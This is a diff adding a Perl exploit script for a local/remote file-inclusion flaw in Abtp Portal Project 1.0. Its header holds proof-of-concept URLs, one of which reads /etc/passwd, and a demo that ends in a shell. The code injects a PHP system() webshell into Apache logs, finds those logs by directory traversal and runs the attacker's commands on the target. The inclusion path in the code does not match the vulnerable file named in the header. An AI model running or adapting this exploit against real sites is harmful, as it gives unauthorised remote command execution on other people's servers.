@@ -1,0 +1,280 @@
+#!/usr/bin/perl
+
+=about
+----------------------------------------------------------------------------------------------------
+
+  Name : Abtp Portal Project <= 1.0
+  Site : http://sourceforge.net/projects/abtpportal/
+  Down : http://sourceforge.net/project/platformdownload.php?group_id=59168
+
+----------------------------------------------------------------------------------------------------
+
+  
+  Found By : br0ly
+  Made in  : Brasil
+  Contact  : br0ly[dot]Code[at]gmail[dot]com
+
+----------------------------------------------------------------------------------------------------
+
+  Description:
+
+  Bug : Local/Remote File Inclusion
+
+  Look this: includes/esqueletos/skel_null.php:1: <? include($ABTPV_BLOQUE_CENTRAL); ?>
+  The variable $ ABTPV_BLOQUE_CENTRAL was not correctly stated thus enabling the attack include malicious files or read files from the system.
+  
+  If allow_url_fopen=on   --> RFI;
+  If magic_quotes_gpc=off --> LFI;   
+
+----------------------------------------------------------------------------------------------------
+
+  P0c:
+    
+    RFI:http://localhost/Scripts/abtpportal0.1.0/includes/esqueletos/skel_null.php?ABTPV_BLOQUE_CENTRAL=[EVIL_CODE]?
+
+    LFI:http://localhost/Scripts/abtpportal0.1.0/includes/esqueletos/skel_null.php?ABTPV_BLOQUE_CENTRAL=/etc/passwd
+
+  OBS: need register_globals=on;
+
+----------------------------------------------------------------------------------------------------
+  Exploit Demo:
+
+    perl abtpportal.txt http://localhost/Scripts/abtpportal0.1.0
+
+      --------------------------------------
+      - Abtp Portal Project	           
+      - RCE Exploit                        
+      - by br0ly                           
+      --------------------------------------
+
+    [*] Injecting evil php code ..
+    [*] Cheeking for Apache Logs ..
+    [*] Apache Log Injection completed
+    [*] Path: /var/log/apache2/access.log
+    [!] Hi my master, do your job now [;D]
+
+    shell[localhost]$> id
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    
+----------------------------------------------------------------------------------------------------
+
+  
+Greetz : Osirys.
+
+;D
+
+=cut
+
+use IO::Socket::INET;
+use LWP::UserAgent;
+
+
+my $host	=  $ARGV[0];
+my $lfi_path	=  "/help.php?module=";
+my $gotcha      =  0;
+my $null	= "%00";	
+my $rand1	=  "1337".$rand_a."1337";
+my $rand_b	=  int(rand 150);
+my $rand2	=  "1337".$rand_b."1337";
+my $dir		=  "../../../../../../../../../..";    
+my @logs_dirs   =  qw(
+                      /var/log/httpd/access_log
+                      /var/log/httpd/access.log
+                      /var/log/httpd/error.log
+                      /var/log/httpd/error_log
+                      /var/log/access_log
+                      /logs/error.log
+                      /logs/access.log
+                      /var/log/apache/error_log
+                      /var/log/apache/error.log
+		      /var/log/apache2/error_log
+                      /var/log/apache2/error.log
+                      /etc/httpd/logs/access_log
+                      /usr/local/apache/logs/error_log
+		      /usr/local/apache2/logs/error_log
+		      /etc/httpd/logs/access.log
+                      /etc/httpd/logs/error_log
+                      /etc/httpd/logs/error.log
+                      /usr/local/apache/logs/access_log
+                      /usr/local/apache/logs/access.log
+		      /usr/local/apache2/logs/access_log
+                      /usr/local/apache2/logs/access.log
+                      /var/www/logs/access_log
+                      /var/www/logs/access.log
+                      /var/log/apache/access_log
+                      /var/log/apache/access.log
+		      /var/log/apache2/access_log
+                      /var/log/apache2/access.log
+                      /var/log/access_log
+                      /var/www/logs/error_log
+                      /var/www/logs/error.log
+                      /usr/local/apache/logs/error.log
+		      /usr/local/apache2/logs/error.log
+		      /var/log/error_log
+                      /apache/logs/error.log
+                      /apache/logs/access.log
+                    );
+
+my $php_code   =  "<?php if(get_magic_quotes_gpc()){ \$_GET[cmd]=st".
+                  "ripslashes(\$_GET[cmd]);} system(\$_GET[cmd]);?>";
+
+ if (@ARGV < 1) { 
+  
+      &banner(); 
+      &help("-1"); 
+  }
+
+  elsif (cheek($host) == 1) {
+	  
+	  &banner();
+
+	  $datas = get_input($host);
+	  $datas =~ /(.*) (.*)/;
+	  ($h0st,$path) = ($1,$2);
+
+	  &xploit();
+  }
+  
+  else {
+      
+      &banner();
+      help("-2");
+  }
+
+
+sub xploit () {
+
+    $sock = IO::Socket::INET->new(
+                                PeerAddr => $h0st,
+                                PeerPort => 80,
+                                Proto => "tcp"
+			      ) || die "Can't connect to $host:80!\n";
+    
+    print "[*] Injecting evil php code ..\n";
+
+    print $sock "GET /br0ly_log_inj start0:".$rand1.$php_code.":0end".$rand2." HTTP/1.1\r\n";
+    print $sock "Host: ".$host."\r\n";
+    print $sock "Connection: close\r\n\r\n";
+    close($sock);
+    
+    print "[*] Cheeking for Apache Logs ..\n";
+
+    while (($log = <@logs_dirs>)&&($gotcha != 1)) {
+	
+	$tmp_path = $host.$lfi_path.$dir.$log.$null;
+	$re = get_req($tmp_path);
+	
+	if ($re =~ /br0ly_log_inj/) {
+	    
+	    $gotcha = 1;
+	    $log_path = $tmp_path;
+	    print "[*] Apache Log Injection completed\n";
+	    print "[*] Path: $log\n";
+	    print "[!] Hi my master, do your job now [;D]\n\n";
+	    &exec_cmd;
+	}
+    }
+
+    $gotcha == 1 || die "[-] Couldn't find Apache Logs\n";
+
+}
+
+sub exec_cmd {
+    
+      $h0st !~ /www\./ || $h0st =~ s/www\.//;
+      print "shell[$h0st]\$> ";
+      $cmd = <STDIN>;
+      $cmd !~ /exit/ || die "[-] Quitting ..\n\n";
+      $exec_url = $log_path."&cmd=".$cmd;
+      my $re = get_req($exec_url);
+      my $content = tag($re);
+    
+      if ($content =~ m/start0:$rand1(.+)\*:0end$rand2/g) {
+	
+	  my $out = $1;
+	  $out =~ s/\$/ /g;
+	  $out =~ s/\*/\n/g;
+	  chomp($out);
+	  print "$out\n";
+	  &exec_cmd;
+      }
+
+      else {
+        
+	  $c++;
+	  $cmd =~ s/\n//;
+	  print "bash: ".$cmd.": command not found\n";
+	  $c < 3 || die "[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n";
+	  &exec_cmd;
+      }
+
+}
+
+
+sub get_input() {
+   
+    my $host = $_[0];
+    $host =~ /http:\/\/(.*)/;
+    $s_host = $1;
+    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
+    ($h0st,$path) = ($1,$2);
+    $path =~ s/(.*)/\/$1/;
+    $full_det = $h0st." ".$path;
+    return $full_det;
+}
+
+
+
+sub tag() {
+
+    my $string = $_[0];
+    $string =~ s/ /\$/g;
+    $string =~ s/\s/\*/g;
+    return($string);
+}
+
+sub cheek() {
+    
+    my $host  = $_[0];
+    if ($host =~ /http:\/\/(.*)/) {
+        return 1;
+    }
+    else {
+        return 0;
+    }
+}
+
+sub get_req() {
+  
+    $link = $_[0];
+    my $req = HTTP::Request->new(GET => $link);
+    my $ua = LWP::UserAgent->new();
+    $ua->timeout(4);
+    my $response = $ua->request($req);
+    return $response->content;
+}
+
+sub help() {
+
+    my $error = $_[0];
+    if ($error == -1) {
+        print "\n[-] Error, missed some arguments !\n\n";
+    }
+    
+    elsif ($error == -2) {
+
+        print "\n[-] Error, Bad arguments !\n";
+    }
+  
+    print "[*] Usage : perl $0 http://localhost//\n\n";
+    exit(0);
+}
+
+sub banner () {
+print "\n".
+" --------------------------------------\n".
+" - Abtp Portal Project \n".
+" - RCE Exploit \n".
+" - by br0ly \n".
+" --------------------------------------\n\n";
+}
